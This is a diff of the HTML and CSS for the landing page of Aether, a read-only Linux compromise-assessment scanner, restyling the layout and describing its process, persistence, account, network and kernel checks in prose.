+    table.matrix th, table.matrix td {
+      padding: 1rem 1.25rem;
+      border-bottom: 1px solid var(--glass-border);
+    }
+    table.matrix th {
+      background: rgba(16, 28, 51, 0.7);
+      color: var(--ink);
+      font-family: var(--font-display);
+      font-size: 0.88rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      font-weight: 700;
+    }
+    table.matrix tr:last-child td { border-bottom: none; }
+    table.matrix tr:hover td { background: rgba(34, 211, 238, 0.02); }
+    .col-highlight {
+      background: rgba(34, 211, 238, 0.05) !important;
+      font-weight: 600;
+      color: var(--ice);
+    }
+    .check-yes { color: var(--safe); font-weight: 700; }
+    .check-no { color: var(--muted); }
+
+    /* Split Section: Forensic Dossier & Format Matrix */
+    .split {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) minmax(0, 1.05fr);
+      gap: 2rem;
+      align-items: start;
+      margin-top: 2rem;
+    }
+
+    .format-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
       gap: 1rem;
       margin-top: 1.5rem;
     }
-    .step {
+    .format-card {
       background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      padding: 1.25rem 1.2rem 1.35rem;
-      min-height: 100%;
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-md);
+      padding: 1.25rem;
+      transition: all var(--fast) var(--ease);
     }
-    .step span {
-      font-family: var(--mono);
-      color: var(--teal);
-      font-size: 0.78rem;
-      letter-spacing: 0.12em;
+    .format-card:hover {
+      border-color: var(--teal);
+      transform: translateY(-2px);
     }
-    .step h3 { margin: 0.55rem 0 0.4rem; color: var(--ink); font-size: 1.25rem; }
-    .step p { margin: 0; }
-    .step code, .dossier code, pre {
-      font-family: var(--mono);
-      font-size: 0.86em;
+    .format-card h3 {
+      margin: 0 0 0.35rem;
+      color: var(--ink);
+      font-size: 1.05rem;
+      font-weight: 650;
+      display: flex;
+      align-items: center;
+      gap: 0.45rem;
+    }
+    .format-card p {
+      margin: 0;
+      font-size: 0.9rem;
+      color: var(--muted);
+      line-height: 1.5;
     }
 
-    .split {
-      display: grid;
-      min-width: 0;
-      grid-template-columns: minmax(0, 0.9fr) minmax(0, 1.1fr);
-      gap: 1.5rem;
-      align-items: start;
-    }
-    .dossier {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      padding: 1.25rem 1.25rem 1.1rem;
+    /* High-Fidelity Forensic Dossier Card with Interactive Modal Trigger */
+    .dossier-card {
+      background: linear-gradient(180deg, rgba(16, 28, 51, 0.95), rgba(10, 17, 32, 0.98));
+      border: 1px solid var(--alert-border);
+      border-radius: var(--radius-lg);
+      padding: 1.75rem;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), var(--alert-glow);
+      position: relative;
     }
     .dossier-top {
       display: flex;
       justify-content: space-between;
-      gap: 1rem;
       align-items: center;
+      gap: 1rem;
+      margin-bottom: 0.75rem;
     }
-    .pill {
+    .dossier-meta {
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: var(--muted);
+      margin: 0;
+    }
+    .pill-alert {
       display: inline-flex;
       align-items: center;
-      min-height: 32px;
-      padding: 0 0.7rem;
-      border-radius: 999px;
-      border: 1px solid rgba(244, 63, 94, 0.45);
+      gap: 0.35rem;
+      padding: 0.25rem 0.75rem;
+      border-radius: var(--radius-full);
+      background: var(--alert-bg);
+      border: 1px solid var(--alert-border);
       color: #fecdd6;
-      background: rgba(244, 63, 94, 0.12);
-      font-family: var(--mono);
+      font-family: var(--font-mono);
       font-size: 0.75rem;
+      font-weight: 700;
       letter-spacing: 0.08em;
+      text-transform: uppercase;
     }
-    .dossier h3 { margin: 0.8rem 0 0.35rem; color: var(--ink); font-size: 1.35rem; letter-spacing: -0.02em; }
-    .meta { color: var(--faint); font-family: var(--mono); font-size: 0.82rem; margin: 0; }
-    .why { margin: 0.9rem 0; }
-    .chips { display: flex; flex-wrap: wrap; gap: 0.4rem; margin: 0; padding: 0; list-style: none; }
-    .chips li {
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 0.3rem 0.5rem;
+    .dossier-card h3 {
+      margin: 0.5rem 0 0.25rem;
+      color: var(--ink);
+      font-family: var(--font-display);
+      font-size: 1.4rem;
+      font-weight: 700;
+    }
+    .target-path {
+      font-family: var(--font-mono);
       font-size: 0.85rem;
+      color: var(--teal);
+      background: rgba(34, 211, 238, 0.08);
+      padding: 0.2rem 0.5rem;
+      border-radius: 4px;
+      display: inline-block;
+      margin-bottom: 0.85rem;
+    }
+    .why-text {
+      margin: 0 0 1rem;
+      color: var(--body);
+      font-size: 0.98rem;
+      line-height: 1.6;
+    }
+    .chips-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin: 0 0 1.25rem;
+      padding: 0;
+      list-style: none;
+    }
+    .chip {
+      font-family: var(--font-mono);
+      font-size: 0.76rem;
       color: var(--muted);
+      background: rgba(16, 28, 51, 0.8);
+      border: 1px solid var(--glass-border);
+      border-radius: 6px;
+      padding: 0.25rem 0.6rem;
     }
-    .dossier ol { margin: 0.8rem 0 0; padding-left: 1.15rem; }
-    .dossier li + li { margin-top: 0.35rem; }
-    .note { color: var(--faint); font-size: 0.92rem; }
-
-    .reports {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 0.75rem;
+    .remediation-box {
+      background: rgba(5, 8, 17, 0.7);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-sm);
+      padding: 0.85rem 1rem;
+      margin-top: 1rem;
+    }
+    .remediation-title {
+      font-family: var(--font-mono);
+      font-size: 0.74rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--safe);
+      margin: 0 0 0.4rem;
+    }
+    .remediation-box p {
+      margin: 0;
+      font-size: 0.9rem;
+      color: var(--ink);
+    }
+    .inspect-modal-trigger {
       margin-top: 1.25rem;
+      width: 100%;
     }
-    .reports article {
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 1rem;
-      background: var(--raised);
-    }
-    .reports h3 { margin: 0 0 0.35rem; color: var(--ink); font-size: 1rem; }
-    .reports p { margin: 0; font-size: 0.95rem; }
 
-    pre.cmd {
-      margin: 1.25rem 0 0;
-      max-width: 100%;
-      min-width: 0;
-      padding: 1.1rem 1.15rem;
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 14px;
+    /* Command Terminal Component with Copy Button */
+    .cmd-terminal {
+      margin: 1.5rem 0 0;
+      background: #04070f;
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      box-shadow: 0 16px 45px rgba(0, 0, 0, 0.55);
+    }
+    .cmd-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0.65rem 1rem;
+      background: rgba(16, 28, 51, 0.6);
+      border-bottom: 1px solid var(--glass-border);
+    }
+    .cmd-label {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--muted);
+      letter-spacing: 0.06em;
+    }
+    .copy-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      background: rgba(34, 211, 238, 0.1);
+      border: 1px solid rgba(34, 211, 238, 0.25);
+      color: var(--teal);
+      border-radius: 6px;
+      padding: 0.25rem 0.65rem;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all var(--fast) var(--ease);
+    }
+    .copy-btn:hover {
+      background: var(--teal);
+      color: #050811;
+      box-shadow: 0 0 12px rgba(34, 211, 238, 0.4);
+    }
+    pre.cmd-body {
+      margin: 0;
+      padding: 1.25rem 1.4rem;
       overflow-x: auto;
       color: var(--ice);
-      line-height: 1.7;
+      font-family: var(--font-mono);
+      font-size: 0.92rem;
+      line-height: 1.75;
     }
-    pre.cmd code { overflow-wrap: normal; }
-    .limits { margin: 1rem 0 0; padding-left: 1.15rem; max-width: var(--measure); }
-    .limits li + li { margin-top: 0.45rem; }
+    pre.cmd-body code { overflow-wrap: normal; }
 
+    /* ==========================================================================
+       INTERACTIVE FORENSIC DOSSIER MODAL DIALOG
+       ========================================================================== */
+
+    .modal-backdrop {
+      position: fixed;
+      inset: 0;
+      background: rgba(5, 8, 17, 0.85);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      z-index: 1000;
+      display: grid;
+      place-items: center;
+      padding: 1.5rem;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity var(--base) var(--ease);
+    }
+    .modal-backdrop.is-open {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .modal-window {
+      background: linear-gradient(180deg, #101c33 0%, #0a1120 100%);
+      border: 1px solid var(--glass-border-lit);
+      border-radius: var(--radius-lg);
+      width: min(720px, 100%);
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 32px 80px rgba(0, 0, 0, 0.8), var(--accent-glow);
+      transform: scale(0.94) translateY(12px);
+      transition: transform var(--base) var(--ease);
+      display: flex;
+      flex-direction: column;
+    }
+    .modal-backdrop.is-open .modal-window {
+      transform: scale(1) translateY(0);
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1.25rem 1.5rem;
+      border-bottom: 1px solid var(--glass-border);
+      background: rgba(10, 17, 32, 0.6);
+    }
+    .modal-header h3 {
+      margin: 0;
+      font-family: var(--font-display);
+      font-size: 1.25rem;
+      color: var(--ink);
+    }
+    .modal-close-btn {
+      background: transparent;
+      border: 1px solid var(--glass-border);
+      color: var(--muted);
+      border-radius: 8px;
+      width: 34px;
+      height: 34px;
+      display: grid;
+      place-items: center;
+      cursor: pointer;
+      transition: all var(--fast) var(--ease);
+    }
+    .modal-close-btn:hover {
+      background: var(--alert-bg);
+      border-color: var(--alert-border);
+      color: var(--alert);
+    }
+
+    .modal-body {
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+    .hexdump-block {
+      background: #03050a;
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-sm);
+      padding: 0.85rem 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      color: #94a3b8;
+      overflow-x: auto;
+      line-height: 1.6;
+    }
+    .hexdump-match {
+      color: var(--alert);
+      font-weight: 700;
+      background: rgba(244, 63, 94, 0.15);
+      padding: 0.1rem 0.3rem;
+      border-radius: 3px;
+    }
+
+    /* Toast Notification HUD Component */
+    #hud-toast {
+      position: fixed;
+      bottom: 2rem;
+      right: 2rem;
+      z-index: 1100;
+      background: rgba(16, 28, 51, 0.95);
+      border: 1px solid var(--teal);
+      color: var(--ice);
+      padding: 0.75rem 1.25rem;
+      border-radius: var(--radius-md);
+      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.6), var(--accent-glow);
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      transform: translateY(120%);
+      opacity: 0;
+      pointer-events: none;
+      transition: transform var(--base) var(--ease), opacity var(--base) var(--ease);
+      backdrop-filter: blur(12px);
+    }
+    #hud-toast.is-active {
+      transform: translateY(0);
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    /* Site Footer */
     footer.site {
       position: relative;
       z-index: 1;
-      border-top: 1px solid var(--border);
-      padding: 1.5rem 0 calc(1.75rem + env(safe-area-inset-bottom));
+      border-top: 1px solid var(--glass-border);
+      padding: 2.5rem 0 calc(2.5rem + env(safe-area-inset-bottom));
       color: var(--faint);
+      margin-top: 3rem;
+      background: rgba(5, 8, 17, 0.8);
+      backdrop-filter: blur(12px);
     }
     footer.site .wrap {
       display: flex;
       flex-wrap: wrap;
-      gap: 0.75rem 1.5rem;
+      gap: 1rem 2rem;
       justify-content: space-between;
       align-items: center;
     }
-    footer nav { display: flex; flex-wrap: wrap; gap: 0.35rem 1rem; }
+    footer nav { display: flex; flex-wrap: wrap; gap: 0.5rem 1.25rem; }
     footer a { color: var(--muted); min-height: 44px; display: inline-flex; align-items: center; }
+    footer a:hover { color: var(--teal); }
 
-    .reveal { opacity: 0; transform: translateY(12px); animation: rise var(--slow) var(--ease) forwards; }
-    .reveal:nth-child(2) { animation-delay: 40ms; }
-    @keyframes rise { to { opacity: 1; transform: none; } }
-
-      @media (max-width: 900px) {
-      .hero, .split, .steps { grid-template-columns: 1fr; }
-      .deck li { grid-template-columns: 3rem 1fr; }
-      .deck h3 { grid-column: 2; }
-      .deck p { grid-column: 1 / -1; }
+    /* Responsive Breakdown */
+    @media (max-width: 980px) {
+      .hero, .split { grid-template-columns: 1fr; gap: 2.5rem; }
+      .metric-ribbon { grid-template-columns: repeat(2, 1fr); }
+      .deck-grid, .steps-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
     }
-    @media (max-width: 720px) {
-      header.site { height: auto; min-height: var(--header); }
-      .bar { flex-wrap: wrap; padding: 0.4rem 0; }
-      nav ul { justify-content: flex-start; }
-      .hero { padding-top: 2.4rem; gap: 1.75rem; }
-      .reports { grid-template-columns: 1fr; }
-      .actions { flex-direction: column; align-items: stretch; }
-      .instrument footer { flex-direction: column; align-items: stretch; }
+    @media (max-width: 680px) {
+      .metric-ribbon, .deck-grid, .steps-grid, .format-grid { grid-template-columns: 1fr; }
+      .bar { flex-direction: column; align-items: flex-start; gap: 0.75rem; }
+      nav ul { flex-wrap: wrap; }
+      .hero { padding-top: 3rem; }
+      .cockpit-footer { flex-direction: column; align-items: stretch; }
       .transport { width: 100%; }
       .transport .btn { flex: 1; }
     }
+
+    /* Accessibility / Reduced Motion */
     @media (prefers-reduced-motion: reduce) {
       html { scroll-behavior: auto; }
-      .reveal { opacity: 1; transform: none; animation: none; }
-      .rail span, .instrument.is-playing .rail span { animation: none; transform: none; opacity: 0; }
-      .btn { transition: none; }
+      *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+      .rail span, .cockpit-frame.is-playing .rail span { animation: none; transform: none; opacity: 0; }
+      .reveal-on-scroll { opacity: 1 !important; transform: none !important; }
+      #ambient-canvas { display: none; }
+    }
+
+    /* High-Contrast Print Stylesheet */
+    @media print {
+      body { background: #fff !important; color: #000 !important; }
+      #ambient-canvas, header.site, .transport, #hud-toast, .inspect-modal-trigger, .modal-backdrop { display: none !important; }
+      .cockpit-frame, .deck-card, .step-card, .dossier-card, .cmd-terminal, .matrix-wrap {
+        border: 1px solid #999 !important;
+        background: #fff !important;
+        color: #000 !important;
+        box-shadow: none !important;
+      }
+      h1, h2, h3, strong { color: #000 !important; }
+      .state, .pill-alert, .chip { border: 1px solid #333 !important; color: #000 !important; background: transparent !important; }
     }
   </style>
 </head>
 <body>
   <a class="skip" href="#content">Skip to content</a>
+
+  <!-- Hardware-Accelerated Ambient Aurora Canvas -->
+  <canvas id="ambient-canvas" aria-hidden="true"></canvas>
+
+  <!-- Floating Navigation Bar -->
   <header class="site">
     <div class="bar">
-      <a class="brand" href="#content">
-        <svg width="22" height="22" viewBox="0 0 24 24" aria-hidden="true">
-          <path d="M4 18 L12 4 L20 18" fill="none" stroke="#22D3EE" stroke-width="1.8"/>
-          <path d="M8 18 H16" stroke="#E0FEFF" stroke-width="1.8"/>
-        </svg>
-        AETHER
-      </a>
-      <nav aria-label="Page">
+      <div class="brand-wrap">
+        <a class="brand" href="#content" aria-label="Aether Homepage">
+          <div class="brand-logo-frame">
+            <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M4 18 L12 4 L20 18" fill="none" stroke="#22D3EE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M8 18 H16" stroke="#F0FDFF" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+          </div>
+          AETHER
+        </a>
+        <div class="status-pill" title="Read-only endpoint compromise hunter">
+          <span class="status-dot" aria-hidden="true"></span>
+          <span>Engine Active</span>
+        </div>
+      </div>
+      <nav aria-label="Site Navigation">
         <ul>
           <li><a href="#coverage">Coverage</a></li>
-          <li><a href="#scan">Scan</a></li>
-          <li><a href="#report">Report</a></li>
-          <li><a href="#start">Start</a></li>
-          <li><a href="https://github.com/MR-N1CK/aether">Source</a></li>
+          <li><a href="#scan">Lifecycle</a></li>
+          <li><a href="#matrix">Comparison</a></li>
+          <li><a href="#report">Formats</a></li>
+          <li><a href="#start">Quickstart</a></li>
+          <li>
+            <a class="nav-github-btn" href="https://github.com/MR-N1CK/aether" target="_blank" rel="noopener">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+                <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/>
+              </svg>
+              <span>GitHub</span>
+            </a>
+          </li>
         </ul>
       </nav>
     </div>
@@ -536,244 +1341,635 @@
 
   <main id="content">
     <div class="wrap">
-      <section class="hero" aria-labelledby="title">
+
+      <!-- Hero Section -->
+      <section class="hero" aria-labelledby="hero-title">
         <div>
-          <p class="kicker">Linux threat hunting</p>
-          <h1 id="title">Know if the host is <em>clean</em>.</h1>
-          <p class="lede">Aether is a read-only compromise assessment for Linux. It inspects the live host, explains what it found in plain language, and never executes the files it reads.</p>
+          <div class="kicker">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
+            Zero-Contamination DFIR Engine
+          </div>
+          <h1 id="hero-title">Know if the endpoint is <em>clean</em>.</h1>
+          <p class="lede">
+            Aether is a read-only Linux threat hunting and incident response scanner. Statically inspects processes, persistence, accounts, network sockets, kernel modules, and binaries without mutating timestamps or executing suspect code.
+          </p>
           <div class="actions">
-            <a class="btn btn-primary" href="#start">Run a first scan</a>
-            <a class="btn btn-ghost" href="https://github.com/MR-N1CK/aether">Read the source</a>
+            <a class="btn btn-primary" href="#start">
+              <span>Run First Scan</span>
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </a>
+            <a class="btn btn-ghost" href="https://github.com/MR-N1CK/aether" target="_blank" rel="noopener">
+              <span>Inspect Source</span>
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6M15 3h6v6M10 14L21 3"/></svg>
+            </a>
           </div>
           <ul class="facts">
-            <li>Read-only opens</li>
-            <li>No outbound telemetry</li>
-            <li>MITRE ATT&amp;CK on findings</li>
+            <li>
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+              <span>Strict O_NOATIME opens</span>
+            </li>
+            <li>
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
+              <span>Zero outbound telemetry</span>
+            </li>
+            <li>
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg>
+              <span>MITRE ATT&amp;CK enriched</span>
+            </li>
           </ul>
         </div>
 
-        <article class="instrument is-playing" id="sample" aria-labelledby="sample-title">
-          <header>
-            <span id="sample-title">Illustrative sample</span>
-            <span>Not this machine</span>
-          </header>
+        <!-- Cockpit Instrument Component with Spotlight Hover -->
+        <article class="cockpit-frame spotlight-card is-playing" id="sample" aria-labelledby="cockpit-heading">
+          <div class="cockpit-header">
+            <div class="window-dots">
+              <span class="dot dot-red"></span>
+              <span class="dot dot-yellow"></span>
+              <span class="dot dot-green"></span>
+            </div>
+            <div class="cockpit-title" id="cockpit-heading">
+              <span>Flight Deck HUD</span>
+              <span class="cockpit-tag">Simulation Mode</span>
+            </div>
+            <span class="mono" style="font-size:0.75rem; color:var(--muted);">60 FPS</span>
+          </div>
+
           <div class="rail" aria-hidden="true"><span></span></div>
+
           <ol class="mods">
             <li class="mod is-wait" data-module="process">
               <span class="mark" aria-hidden="true">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><rect x="6" y="6" width="12" height="12"/><path d="M9 2v4M15 2v4M9 18v4M15 18v4M2 9h4M2 15h4M18 9h4M18 15h4"/></svg>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="6" y="6" width="12" height="12"/><path d="M9 2v4M15 2v4M9 18v4M15 18v4M2 9h4M2 15h4M18 9h4M18 15h4"/></svg>
               </span>
-              <strong>Process</strong>
+              <strong>Process Hunter</strong>
               <span class="state">Waiting</span>
             </li>
             <li class="mod is-wait" data-module="persistence">
               <span class="mark" aria-hidden="true">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="8" cy="14" r="3"/><path d="M11 14h8l2-2 2 2-2 2h-2"/></svg>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="8" cy="14" r="3"/><path d="M11 14h8l2-2 2 2-2 2h-2"/></svg>
               </span>
-              <strong>Persistence</strong>
+              <strong>Persistence Audit</strong>
               <span class="state">Waiting</span>
             </li>
             <li class="mod is-wait" data-module="users">
               <span class="mark" aria-hidden="true">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="12" cy="8" r="3"/><path d="M5 19c1.5-3 3.8-4.5 7-4.5S17.5 16 19 19"/></svg>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="3"/><path d="M5 19c1.5-3 3.8-4.5 7-4.5S17.5 16 19 19"/></svg>
               </span>
-              <strong>Users</strong>
+              <strong>Privilege &amp; Accounts</strong>
               <span class="state">Waiting</span>
             </li>
             <li class="mod is-wait" data-module="network">
               <span class="mark" aria-hidden="true">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="6" cy="12" r="2"/><circle cx="18" cy="7" r="2"/><circle cx="18" cy="17" r="2"/><path d="M8 12h8M16.2 8.4 8.8 11M16.2 15.6 8.8 13"/></svg>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="6" cy="12" r="2"/><circle cx="18" cy="7" r="2"/><circle cx="18" cy="17" r="2"/><path d="M8 12h8M16.2 8.4 8.8 11M16.2 15.6 8.8 13"/></svg>
               </span>
-              <strong>Network</strong>
+              <strong>Network Sockets</strong>
               <span class="state">Waiting</span>
             </li>
             <li class="mod is-wait" data-module="kernel">
               <span class="mark" aria-hidden="true">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><path d="M4 8h16M4 12h16M4 16h16"/><path d="M8 4v16"/></svg>
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 8h16M4 12h16M4 16h16"/><path d="M8 4v16"/></svg>
               </span>
-              <strong>Kernel</strong>
+              <strong>Kernel Integrity</strong>
               <span class="state">Waiting</span>
             </li>
           </ol>
-          <footer>
-            <div>
-              <p class="verdict-kicker">Sample verdict</p>
-              <p id="verdict">Ready</p>
+
+          <div class="cockpit-footer">
+            <div class="verdict-box">
+              <p class="verdict-kicker">Host Verdict Status</p>
+              <p id="verdict">Initializing telemetry…</p>
             </div>
             <div class="transport">
               <button class="btn btn-ghost" type="button" id="pause" aria-pressed="false">Pause</button>
               <button class="btn btn-primary" type="button" id="replay">Replay</button>
             </div>
-            <noscript><p class="note">With animation off: persistence is an alert, network is a notice, and the other areas are clear.</p></noscript>
-          </footer>
+          </div>
         </article>
       </section>
 
-      <section id="coverage" aria-labelledby="coverage-title">
-        <p class="section-label">Coverage</p>
-        <h2 id="coverage-title">Six places an intrusion hides.</h2>
-        <p class="intro">Each pass is structural. Aether reads metadata, configuration, and file contents. It does not launch the file to see what it would do.</p>
-        <ol class="deck">
-          <li>
-            <span class="idx">01</span>
-            <h3>Process</h3>
-            <p>Memory-only binaries, deleted executables still running, name masquerading, and hidden PIDs.</p>
-          </li>
-          <li>
-            <span class="idx">02</span>
-            <h3>Persistence</h3>
-            <p>systemd units, cron and at jobs, sudoers, shell profiles, and SSH authorized keys.</p>
-          </li>
-          <li>
-            <span class="idx">03</span>
-            <h3>Users</h3>
-            <p>Extra UID 0 accounts, duplicate UIDs, empty or obsolete password hashes, and privileged groups.</p>
-          </li>
-          <li>
-            <span class="idx">04</span>
-            <h3>Network</h3>
-            <p>Listeners mapped back to a process, raw sockets, and interfaces left in promiscuous mode.</p>
-          </li>
-          <li>
-            <span class="idx">05</span>
-            <h3>Kernel</h3>
-            <p>Loaded modules compared with sysfs, taint flags, and unexpected modprobe configuration.</p>
-          </li>
-          <li>
-            <span class="idx">06</span>
-            <h3>Files</h3>
-            <p>Unexpected SUID binaries, world-writable configuration, and scripts matched by heuristics or YARA-X.</p>
-          </li>
-        </ol>
-      </section>
+      <!-- Animated Metric Counter Ribbon -->
+      <div class="metric-ribbon reveal-on-scroll" aria-label="Engine Performance Metrics">
+        <div class="metric-card spotlight-card">
+          <div class="metric-value mono" data-counter="21000" data-suffix="+">21,000+</div>
+          <p class="metric-label">Files / Sec Throughput</p>
+        </div>
+        <div class="metric-card spotlight-card">
+          <div class="metric-value mono" data-counter="100" data-suffix="%">100%</div>
+          <p class="metric-label">Static Analysis Only</p>
+        </div>
+        <div class="metric-card spotlight-card">
+          <div class="metric-value mono" data-counter="0" data-suffix=" bytes">0</div>
+          <p class="metric-label">Outbound Telemetry</p>
+        </div>
+        <div class="metric-card spotlight-card">
+          <div class="metric-value mono" data-counter="4" data-suffix=" distros">4</div>
+          <p class="metric-label">Package DBs Grounded</p>
+        </div>
+      </div>
 
-      <section id="scan" aria-labelledby="scan-title">
-        <p class="section-label">A scan</p>
-        <h2 id="scan-title">Read, decide, explain.</h2>
-        <div class="steps">
-          <article class="step">
-            <span>01</span>
-            <h3>Read</h3>
-            <p>Files open with <code>O_RDONLY</code>, <code>O_NOFOLLOW</code>, <code>O_NONBLOCK</code>, and <code>O_NOATIME</code> when the kernel allows it. The scanner does not update mtime or ctime.</p>
-          </article>
-          <article class="step">
-            <span>02</span>
-            <h3>Decide</h3>
-            <p>Pure-Go heuristics run in every build. The same embedded rules can be evaluated with YARA-X when you link it. Package databases catch replaced system binaries.</p>
-          </article>
-          <article class="step">
-            <span>03</span>
-            <h3>Explain</h3>
-            <p>Each finding carries a title, why it matters, MITRE ATT&amp;CK techniques, and containment steps. You can read that in the terminal, in JSON, or in one offline HTML file.</p>
-          </article>
+      <!-- Coverage Section -->
+      <section id="coverage" class="reveal-on-scroll" aria-labelledby="coverage-heading">
+        <p class="section-label">Surface Inspection</p>
+        <h2 id="coverage-heading">Six areas an intrusion cannot hide.</h2>
+        <p class="intro">
+          Each audit pass is strictly structural. Aether statically reads kernel structures, memory descriptors, configuration trees, and file bytes using <code>safeopen</code> without executing code.
+        </p>
+
+        <div class="deck-grid">
+          <div class="deck-card spotlight-card">
+            <div class="deck-header">
+              <span class="deck-idx">01</span>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="1.8"><rect x="6" y="6" width="12" height="12"/><path d="M9 2v4M15 2v4M9 18v4M15 18v4M2 9h4M2 15h4M18 9h4M18 15h4"/></svg>
+            </div>
+            <h3>Process Forensics</h3>
+            <p>Unlinks, memory-only execution (<code>/memfd:</code>), deleted binaries, <code>comm</code>/<code>cmdline</code> masquerading, and two-pass hidden PID discovery.</p>
+          </div>
+
+          <div class="deck-card spotlight-card">
+            <div class="deck-header">
+              <span class="deck-idx">02</span>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="1.8"><circle cx="8" cy="14" r="3"/><path d="M11 14h8l2-2 2 2-2 2h-2"/></svg>
+            </div>
+            <h3>Persistence Hunter</h3>
+            <p>Audits systemd units, masked services, cron, at spools, sudoers drop-ins, PAM execution modules, and SSH authorized keys.</p>
+          </div>
+
+          <div class="deck-card spotlight-card">
+            <div class="deck-header">
+              <span class="deck-idx">03</span>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="1.8"><circle cx="12" cy="8" r="3"/><path d="M5 19c1.5-3 3.8-4.5 7-4.5S17.5 16 19 19"/></svg>
+            </div>
+            <h3>Accounts &amp; Privilege</h3>
